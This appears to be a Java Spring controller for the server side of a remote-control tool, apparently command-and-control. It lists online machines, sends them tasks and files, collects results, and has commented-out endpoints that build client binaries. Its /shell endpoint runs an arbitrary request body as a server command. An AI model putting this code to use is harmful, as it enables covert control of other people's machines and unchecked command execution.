package com.evil.rs.controller;

import cn.dev33.satoken.annotation.SaCheckLogin;
import cn.dev33.satoken.stp.StpUtil;
import com.alibaba.fastjson.JSON;
import com.baomidou.mybatisplus.core.metadata.IPage;
import com.evil.rs.config.ConstConfig;
import com.evil.rs.entity.Command;
import com.evil.rs.entity.NotifyMessage;
import com.evil.rs.enums.CommonNumberEnums;
import com.evil.rs.enums.CommonStringEnums;
import com.evil.rs.model.CommandModel;
import com.evil.rs.model.QueryModel;
import com.evil.rs.service.CommandService;
import com.evil.rs.service.MachineService;
import com.evil.rs.socket.WebSocketServer;
import com.evil.rs.utils.CustomFileUtil;
import com.evil.rs.utils.Result;
import com.evil.rs.utils.ShellUtil;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.multipart.MultipartFile;

import javax.servlet.ServletOutputStream;
import javax.servlet.http.HttpServletResponse;
import java.io.*;

@RestController
@RequestMapping("/command")
public class CommandController {

    @Autowired
    CommandService commandService;

    @Autowired
    MachineService machineService;

    /**
     * 获取上线主机列表
     * @param token token
     * @return 上线主机列表
     */
    @SaCheckLogin
    @PostMapping("/listMachine")
    public Result listMachine(
            @RequestHeader(value = "Auth-Token") String token){
        return Result.Ok(machineService.list());
    }

    /**
     * 添加任务
     * @param token 控制端token
     * @param commandModel 任务模型
     * @return 成功
     */
    @PostMapping("/addTask")
    @SaCheckLogin
    public Result addTask(
            @RequestHeader(value = "Auth-Token") String token,
            @RequestBody CommandModel commandModel){
        return commandService.addTask(commandModel, token);
    }

    /**
     * 返回某个机器执行过的任务列表
     * @param token 当前机器的token
     * @param queryModel 查询条件
     * @return 查询结果
     */
    @SaCheckLogin
    @PostMapping("/listTask")
    public IPage<Command> listTask(
            @RequestHeader(value = "Auth-Token") String token,
            @RequestBody QueryModel queryModel){
        System.out.println(queryModel);
        return commandService.listTask(queryModel);
    }

    /**
     * 根据任务id获取返回的二进制文件
     * @param id 任务id
     * @param response 响应
     * @throws IOException
     */
    @GetMapping("/download")
    @SaCheckLogin
    public void download(
            String id,
            HttpServletResponse response) throws IOException {
        Command command = commandService.getById(id);
        String result = command.getResult();
        File file = new File(result);
        if (file.exists()){
            ServletOutputStream outputStream = response.getOutputStream();
            outputStream.write(new FileInputStream(file).readAllBytes());
        }
    }

    /**
     * @descript 控制端上传文件给客户端下载
     * @param receiver 控制端接收者
     * @param target 客户端接收者
     * @param file 要让客户端下载的文件
     * @return 是否上传成功
     */
    @PostMapping("/upload")
    @SaCheckLogin
    public Result uploadClientDownloadFile(
            @RequestParam String receiver,
            @RequestParam String target,
            MultipartFile file){
        String filePath = CustomFileUtil.saveClientDownloadFile(file);
        if (!filePath.isEmpty()){
            Command command = new Command();
            command.setReceiver(receiver);
            command.setTarget(target);
            command.setData(filePath);
            command.setAction(CommonNumberEnums.TASK_DOWNLOAD_FILE.getCode());
            command.setFlag(false);
            commandService.saveOrUpdate(command);
            return Result.Ok();
        }
        return Result.Fail();
    }

    /**
     * 生成二进制程序
     * @param token 生成者token
     * @param target 目标系统
     */
//    @GetMapping("/generate")
//    @SaCheckLogin
//    public void generate(
//            @RequestHeader(value = "Auth-Token") String token,
//            String target){
//        String compileCommand = null;
//        if ("windows".equals(target)) {
//            compileCommand = "cross build --release --target x86_64-pc-windows-msvc";
//        } else if ("linux".equals(target)) {
//            compileCommand = "cross build --release --target x86_64-unknown-linux-gnu";
//        } else {
//            compileCommand = "cross build --release --target x86_64-apple-darwin";
//        }
//        int exitCode = ShellUtil.executeShell(token, compileCommand, ConstConfig.COMPILE_DIRECTOR);
//        System.out.println(exitCode);
//        if (exitCode == 0){
//            NotifyMessage notifyMessage = new NotifyMessage(CommonStringEnums.NOTIFY_GENERATE_SUCCESS.getDescription(), "");
//            WebSocketServer.notifyReceiver(token, JSON.toJSONString(notifyMessage));
//        }else {
//            NotifyMessage notifyMessage = new NotifyMessage(CommonStringEnums.NOTIFY_GENERATE_FAIL.getDescription(), "");
//            WebSocketServer.notifyReceiver(token, JSON.toJSONString(notifyMessage));
//        }
//    }

    /**
     * 下载二进制程序
     * @param target 目标系统
     */
//    @GetMapping("/downloadGenerate")
//    @SaCheckLogin
//    public void downloadGenerate(
//            String target,
//            HttpServletResponse response) throws IOException {
//        String targetFile = null;
//        if ("windows".equals(target)) {
//            targetFile = ConstConfig.GENERATE_TARGET_WIN;
//        } else if ("linux".equals(target)) {
//            targetFile = ConstConfig.GENERATE_TARGET_LINUX;
//        }
//        File file = new File(ConstConfig.GENERATE_DIRECTOR + targetFile);
//        if (file.exists()){
//            ServletOutputStream outputStream = response.getOutputStream();
//            outputStream.write(new FileInputStream(file).readAllBytes());
//        }
//    }

    /**
     * 编辑编译配置文件
     * @param text 要修改后的配置文件内容
     */
//    @PostMapping("/editCompileFile")
//    @SaCheckLogin
//    public Result editCompileFile(
//            @RequestBody(required = false) String text) throws IOException {
//        File compileConfigFile = new File(ConstConfig.COMPILE_CONFIG_PROFILE);
//        if (compileConfigFile.exists()){
//            if (text != null){
//                FileOutputStream outputStream = new FileOutputStream(compileConfigFile);
//                outputStream.write(text.getBytes());
//                return Result.Ok();
//            }
//            FileInputStream fileInputStream = new FileInputStream(compileConfigFile);
//            byte[] data = fileInputStream.readAllBytes();
//            String configText = new String(data);
//            return Result.Ok(configText);
//        }
//        return Result.Fail();
//    }

    /**
     * 执行命令
     * @param token 接受命令响应数据
     * @param shell 命令
     */
    @PostMapping("/shell")
    @SaCheckLogin
    public void shell(
            @RequestHeader(value = "Auth-Token") String token,
            @RequestBody String shell){
        ShellUtil.executeShell(token, shell, ".");
    }

}
